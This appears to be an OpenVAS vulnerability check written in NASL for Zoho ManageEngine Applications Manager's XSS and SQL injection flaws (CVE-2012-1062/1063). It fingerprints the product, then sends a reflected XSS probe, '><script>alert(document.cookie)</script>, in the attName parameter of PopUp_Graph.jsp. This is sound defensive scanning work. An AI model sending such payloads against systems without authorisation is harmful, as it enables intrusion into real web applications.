###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_manageengine_applications_manager_mult_xss_n_sql_inj_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Zoho ManageEngine Applications Manager Multiple XSS and SQL Injection Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in context of an affected site and
  compromise the application, access or modify data, or exploit latent
  vulnerabilities in the underlying database.
  Impact Level: Application";
tag_affected = "ManageEngine Applications Manager version 9.x and 10.x";
tag_insight = "The flaws are due to an input passed to the
  - 'query', 'selectedNetwork', 'network', and 'group' parameters in various
    scripts is not properly sanitised before being returned to the user.
  - 'viewId' parameter to fault/AlarmView.do and 'period' parameter to
    showHistoryData.do is not properly sanitised before being used in SQL
    queries.";
tag_solution = "No solution or patch is available as of 16th, February 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.manageengine.com/products/applications_manager/";
tag_summary = "This host is running Zoho ManageEngine Applications Manager and is
  prone to multiple cross site scripting and SQL injection vulnerabilities.";

if(description)
{
  script_id(802424);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-1062", "CVE-2012-1063");
  script_bugtraq_id(51796);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-02-16 15:09:43 +0530 (Thu, 16 Feb 2012)");
  script_name("Zoho ManageEngine Applications Manager Multiple XSS and SQL Injection Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/47724");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/72830");
  script_xref(name : "URL" , value : "http://www.vulnerability-lab.com/get_content.php?id=115");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/109238/VL-115.txt");

  script_description(desc);
  script_summary("Check if Zoho ManageEngine Applications Manager prone to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 8080);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = 0;
sndReq = "";
rcvRes = "";

## Get HTTP Port
port = get_http_port(default:8080);
if(!port){
  port = 8080;
}

## Check port staus
if(!get_port_state(port)) {
  exit(0);
}

sndReq = http_get(item:"/jsp/PreLogin.jsp", port:port);
rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

## Confirm the application
if(rcvRes && egrep(pattern:">Copyright.*ZOHO Corp.,", string:rcvRes))
{
  ## Construct attack
  url = "/jsp/PopUp_Graph.jsp?restype=QueryMonitor&resids=&attids='&attName=" +
        "><script>alert(document.cookie)</script>";

  ## Confirm exploit worked properly or not
  if(http_vuln_check(port:port, url:url, check_header: TRUE,
         pattern:"<script>alert\(document.cookie\)</script>")){
    security_hole(port);
  }
}

